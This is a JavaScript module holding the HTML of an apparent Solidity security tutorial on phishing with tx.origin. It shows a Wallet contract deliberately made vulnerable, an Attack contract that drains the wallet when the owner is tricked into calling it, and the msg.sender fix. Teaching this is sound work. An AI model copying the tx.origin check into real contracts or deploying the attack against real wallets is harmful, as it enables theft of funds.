// metadata
export const version = "0.6.0"
export const title = "Phishing with tx.origin"
export const description = "An example of phishing with tx.origin in Solidity"

const html = `<h3 id="whats-the-difference-between-msgsender-and-txorigin">What&#39;s the difference between <code>msg.sender</code> and <code>tx.origin</code>?</h3>
<p>If contract A calls B, and B calls C, in C <code>msg.sender</code> is B and <code>tx.origin</code> is A.</p>
<h3 id="vulnerability">Vulnerability</h3>
<p>A malicious contract can deceive the owner of a contract into calling a
function that only the owner should be able to call.</p>
<pre><code class="language-solidity">pragma solidity ^0.6.0;

/*
Wallet is a simple contract where only the owner should be able to transfer
Ether to another address. Wallet.transfer() uses tx.origin to check that the
caller is the owner. Let&#39;s see how we can hack this contract
*/

/*
1. Alice deploys Wallet with 10 Ether
2. Eve deploys Attack with the address of Alice&#39;s Wallet contract.
3. Eve tricks Alice to call Attack.attack()
4. Eve successfully stole Ether from Alice&#39;s wallet

What happened?
Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
requested a transfer of all funds in Alice&#39;s wallet to Eve&#39;s address.
Since tx.origin in Wallet.transfer() is equal to Alice&#39;s address,
it authorized the transfer. The wallet transferred all Ether to Eve.
*/

contract Wallet {
    address public owner;

    constructor() public payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call.value(_amount)("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) public {
        wallet = Wallet(_wallet);
        owner = msg.sender;
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<p>Use <code>msg.sender</code> instead of <code>tx.origin</code></p>
<pre><code class="language-solidity">    function transfer(address payable _to, uint _amount) public {
        require(msg.sender == owner, "Not owner");

        (bool sent, ) = _to.call.value(_amount)("");
        require(sent, "Failed to send Ether");
    }</code></pre>
`

export default html
